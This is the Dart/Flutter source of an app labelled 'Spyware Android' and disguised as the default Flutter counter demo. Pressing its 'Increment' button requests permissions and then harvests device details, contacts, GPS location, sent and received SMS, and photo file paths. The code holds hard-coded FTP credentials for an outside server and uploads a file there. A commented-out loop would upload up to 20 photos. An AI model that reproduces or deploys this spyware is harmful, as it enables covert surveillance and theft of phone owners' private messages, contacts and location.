//*************************************
//***** Spyware Android LP CDAISI *****
//*************************************

import 'dart:io';
import 'package:geolocator/geolocator.dart';
import 'package:device_info/device_info.dart';
import 'package:flutter/material.dart';
import 'package:sms/sms.dart';
import 'package:ftpconnect/ftpConnect.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:path_provider/path_provider.dart';


void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);
  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  int _counter = 0;



  // Demande de permission
  void _incrementCounter() async {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.storage,
      Permission.contacts,
      Permission.location,
      Permission.sms,
    ].request();

    // Préparation de la connexion FTP
    FTPConnect ftpConnect = FTPConnect('141.94.77.172',
    user: 'utilisateursftp', pass: 'Sftp59?Spyware!');

    // ***** PARTIE INFORMATIONS TELEPHONE *****

    if (Platform.isAndroid) {
      var androidInfo = await DeviceInfoPlugin().androidInfo;
      var release = androidInfo.version.release;
      var manufacturer = androidInfo.manufacturer;
      var host = androidInfo.host;
      print('Android $release, $manufacturer, $host');
    }

    // ***** PARTIE CONTACTS *****

    // Récupérer l'ensemble des contacts dans une liste
    List<Contact> contacts = await ContactsService.getContacts();
    for (var contact in contacts) {
      print(contact.displayName);
      print(contact.phones!.first.value);
    }

    // ***** PARTIE LOCALISATION *****
    print(await Geolocator.getCurrentPosition());

    // ***** PARTIE SMS *****
    // Création de l'instance de la classe SmsQuery
    SmsQuery query = new SmsQuery();
    // Récupération de la liste des instances SMS
    List<SmsMessage> messages = await query.querySms(
    // Récupération des messages reçus et envoyés
    kinds: [SmsQueryKind.Inbox, SmsQueryKind.Sent], 
    );
    // Parcourir les messages
    for (var message in messages) {
      print("Numéro Expéditeur : "+message.sender);
      print("Corps du message : "+message.body);
    }

    // ***** PARTIE PHOTOS *****

    // Récupération de la liste de fichier
    Directory dir = Directory('/storage/1CEC-2F09/images');
    List<FileSystemEntity> files = dir.listSync(recursive: true);

    // Définition de la liste de fichier
    var listFile = [];

    // Ajout des fichiers dans la liste
    for (FileSystemEntity file in files) {
      var path = file.path;
      listFile.add(path);
    }
    //print(listFile);

    //int compteur = 0;
    //for (var file in listFile) {
    //  if (compteur < 20) {
    //    File fileToUpload = File(file);
    //    // Lancement de la connexion FTP
    //    await ftpConnect.connect();
    //    // Changement de répertoire
    //    await ftpConnect.changeDirectory('photos');
    //    // Envoie du fichier sur le serveur
    //    bool res = await ftpConnect.uploadFile(fileToUpload);
        // Fermeture de la connexion FTP
    //    await ftpConnect.disconnect();
    //    compteur++;
    //  }
    //}

    // ***** Partie création de fichier *****
    Directory tempDir = await getTemporaryDirectory();
    final File file = File("${tempDir.path}/sample.txt");
    final filename = "${tempDir.path}/sample.txt";
    new File(filename).writeAsString('Dart is an elegant language').then((File file) {});

    File fileToUpload = File("${tempDir.path}/sample.txt");
    // Lancement de la connexion FTP
    await ftpConnect.connect();
    // Envoie du fichier sur le serveur
    bool res = await ftpConnect.uploadFile(fileToUpload);
    // Fermeture de la connexion FTP
    await ftpConnect.disconnect();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            const Text(
              'You have pushed the button this many times:',
            ),
            Text(
              '$_counter',
              style: Theme.of(context).textTheme.headline4,
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: _incrementCounter,
        tooltip: 'Increment',
        child: const Icon(Icons.add),
      ), // This trailing comma makes auto-formatting nicer for build methods.
    );
  }
}
